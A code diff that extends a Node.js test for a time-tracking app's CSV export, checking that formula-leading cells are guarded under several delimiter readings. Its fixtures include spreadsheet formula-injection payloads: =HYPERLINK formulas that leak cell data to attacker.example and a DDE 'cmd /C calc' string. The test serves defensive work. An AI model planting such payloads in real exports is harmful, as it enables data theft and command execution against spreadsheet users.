@@ -5,6 +5,7 @@ import os from "node:os";
 import path from "node:path";
 import { after, before, test } from "node:test";
 import { parseCsv, values } from "../fixtures/rfc4180.mjs";
+import { READINGS, cellsUnder, formulaLike } from "../fixtures/spreadsheet-readings.mjs";
 
 if (!process.env.TEST_DATABASE_URL) throw new Error("Set TEST_DATABASE_URL to a migrated disposable PostgreSQL database");
 Object.assign(process.env, {
@@ -17,18 +18,24 @@ const { buildApp } = await import("../../src/app.js");
 const { signAccessToken } = await import("../../src/utils/tokens.js");
 
 const BOM = "\uFEFF";
-// Formula-leading text gains an apostrophe and a tab.
-const GUARD = "'\t";
+// Every formula-leading segment gains a tab and an apostrophe.
+const GUARD = "\t'";
 const HEADER = ["Date", "User", "Project", "Task", "Hours", "Billable", "Rate", "Currency", "Cost", "Description"];
 const NAMES = {
   ADMIN: "Admin",
   WORKER: 'Worker "A", Jr.',
   EVIL: '=HYPERLINK("http://attacker.example/?leak="&A1,"Open")',
+  SEMI: 'Fixed bug;=HYPERLINK("http://attacker.example/?d="&A1);',
 };
 const PROJECT = "-2+3+cmd|' /C calc'!A0";
-const TASK = "@SUM(1,2)\r\nsecond line, \"quoted\"";
+const TASKS = {
+  main: "@SUM(1,2)\r\nsecond line, \"quoted\"",
+  tabTail: "=1+1\ttail",
+  tabSplit: "notes\t=1+1\ttail",
+};
 
-let app, workspace, project, task;
+let app, workspace, project;
+const tasks = {};
 const users = {}, tokens = {};
 let requests = 0;
 const req = (actor, method, url, payload) => app.inject({
@@ -38,20 +45,27 @@ const req = (actor, method, url, payload) => app.inject({
 const exportUrl = (query = "") => `/api/workspaces/${workspace.id}/time/reports/export?startDate=2026-04-01&endDate=2026-04-30${query}`;
 
 // Each entry is logged through the API; expected cells are the exact text a
-// spreadsheet should show.
+// comma-separated reader gets back.
 const fixtures = [
   { actor: "WORKER", body: { date: "2026-04-01", hours: 1.5, description: 'Café, "quoted"\nnext line 日本語 \u{1F600}' },
     row: ["2026-04-01", 'Worker "A", Jr.', GUARD + PROJECT, "", "1.50", "Yes", "12.50", "EUR", "18.75", 'Café, "quoted"\nnext line 日本語 \u{1F600}'] },
-  { actor: "WORKER", body: { date: "2026-04-02", hours: 2, description: "+1+1", task: true },
-    row: ["2026-04-02", 'Worker "A", Jr.', GUARD + PROJECT, GUARD + TASK, "2.00", "Yes", "12.50", "EUR", "25.00", GUARD + "+1+1"] },
+  { actor: "WORKER", body: { date: "2026-04-02", hours: 2, description: "+1+1", task: "main" },
+    row: ["2026-04-02", 'Worker "A", Jr.', GUARD + PROJECT, GUARD + TASKS.main, "2.00", "Yes", "12.50", "EUR", "25.00", GUARD + "+1+1"] },
   { actor: "WORKER", body: { date: "2026-04-03", hours: 0.25, description: "-5", billable: false },
     row: ["2026-04-03", 'Worker "A", Jr.', GUARD + PROJECT, "", "0.25", "No", "12.50", "EUR", "0.00", GUARD + "-5"] },
   { actor: "EVIL", body: { date: "2026-04-04", hours: 3, description: "\t=1+1\r\n" },
-    row: ["2026-04-04", GUARD + NAMES.EVIL, GUARD + PROJECT, "", "3.00", "Yes", "", "", "", GUARD + "\t=1+1\r\n"] },
+    row: ["2026-04-04", GUARD + NAMES.EVIL, GUARD + PROJECT, "", "3.00", "Yes", "", "", "", `${GUARD}\t${GUARD}=1+1\r\n`] },
   { actor: "EVIL", body: { date: "2026-04-05", hours: 1, description: "@cmd" },
     row: ["2026-04-05", GUARD + NAMES.EVIL, GUARD + PROJECT, "", "1.00", "Yes", "", "", "", GUARD + "@cmd"] },
   { actor: "EVIL", body: { date: "2026-04-06", hours: 1, projectless: true },
     row: ["2026-04-06", GUARD + NAMES.EVIL, "", "", "1.00", "Yes", "", "", "", ""] },
+  // Payloads that only become a cell start under a `;`, tab or line-break reading.
+  { actor: "SEMI", body: { date: "2026-04-07", hours: 1, description: "notes;=1+1;tail" },
+    row: ["2026-04-07", `Fixed bug;${GUARD}=HYPERLINK("http://attacker.example/?d="&A1);`, GUARD + PROJECT, "", "1.00", "Yes", "", "", "", `notes;${GUARD}=1+1;tail`] },
+  { actor: "SEMI", body: { date: "2026-04-08", hours: 1, description: "note\n=1+1\r\nmore\r@SUM(1)", task: "tabTail" },
+    row: ["2026-04-08", `Fixed bug;${GUARD}=HYPERLINK("http://attacker.example/?d="&A1);`, GUARD + PROJECT, `${GUARD}=1+1\ttail`, "1.00", "Yes", "", "", "", `note\n${GUARD}=1+1\r\nmore\r${GUARD}@SUM(1)`] },
+  { actor: "SEMI", body: { date: "2026-04-09", hours: 1, description: 'x;"=1+1";y', task: "tabSplit" },
+    row: ["2026-04-09", `Fixed bug;${GUARD}=HYPERLINK("http://attacker.example/?d="&A1);`, GUARD + PROJECT, `notes\t${GUARD}=1+1\ttail`, "1.00", "Yes", "", "", "", `x;${GUARD}"=1+1";y`] },
 ];
 
 before(async () => {
@@ -65,21 +79,24 @@ before(async () => {
     tokens[actor] = signAccessToken({ sub: users[actor].id, email: users[actor].email });
   }
   workspace = await app.prisma.workspace.create({ data: { name: "Time report CSV", slug: `tcsv-${suffix}`, members: { create: [
-    { userId: users.ADMIN.id, role: "ADMIN" }, { userId: users.WORKER.id, role: "MEMBER" }, { userId: users.EVIL.id, role: "MEMBER" },
+    { userId: users.ADMIN.id, role: "ADMIN" }, { userId: users.WORKER.id, role: "MEMBER" },
+    { userId: users.EVIL.id, role: "MEMBER" }, { userId: users.SEMI.id, role: "MEMBER" },
   ] } } });
   project = await app.prisma.project.create({ data: {
     workspaceId: workspace.id, name: PROJECT,
-    members: { create: [users.WORKER.id, users.EVIL.id].map((userId) => ({ userId })) },
+    members: { create: [users.WORKER.id, users.EVIL.id, users.SEMI.id].map((userId) => ({ userId })) },
   } });
   const status = await app.prisma.statusColumn.create({ data: { projectId: project.id, name: "Open" } });
-  task = await app.prisma.task.create({ data: { projectId: project.id, statusId: status.id, title: TASK } });
+  for (const [key, title] of Object.entries(TASKS)) {
+    tasks[key] = await app.prisma.task.create({ data: { projectId: project.id, statusId: status.id, title } });
+  }
   const rate = await req("ADMIN", "POST", `/api/workspaces/${workspace.id}/time/rates/${users.WORKER.id}`, {
     rate: 12.5, currency: "EUR", effectiveFrom: "2026-01-01",
   });
   assert.equal(rate.statusCode, 200, rate.body);
   for (const { actor, body: { task: withTask, projectless, ...body } } of fixtures) {
     const response = await req(actor, "POST", `/api/workspaces/${workspace.id}/time/entries`, {
-      billable: true, ...body, ...(projectless ? {} : withTask ? { taskId: task.id } : { projectId: project.id }),
+      billable: true, ...body, ...(projectless ? {} : withTask ? { taskId: tasks[withTask].id } : { projectId: project.id }),
     });
     assert.equal(response.statusCode, 201, response.body);
   }
@@ -128,9 +145,16 @@ test("numbers and dates are bare and every text cell is quoted", async () => {
     });
   }
   for (const record of records) {
-    for (const { value } of record) {
-      assert.doesNotMatch(value, /^[=+\-@\t\r\n\uFF1D\uFF0B\uFF0D\uFF20]/u, `formula-leading cell ${JSON.stringify(value)}`);
-    }
+    for (const { value } of record) assert(!formulaLike(value), `formula-leading cell ${JSON.stringify(value)}`);
+  }
+});
+
+test("no comma, semicolon, tab or line-split reading of the export starts a cell with a formula", async () => {
+  const document = (await download()).body.slice(BOM.length);
+  for (const reading of READINGS) {
+    const cells = cellsUnder(document, reading);
+    assert(cells.length >= fixtures.length, reading.name);
+    assert.deepEqual(cells.filter(formulaLike), [], reading.name);
   }
 });
 
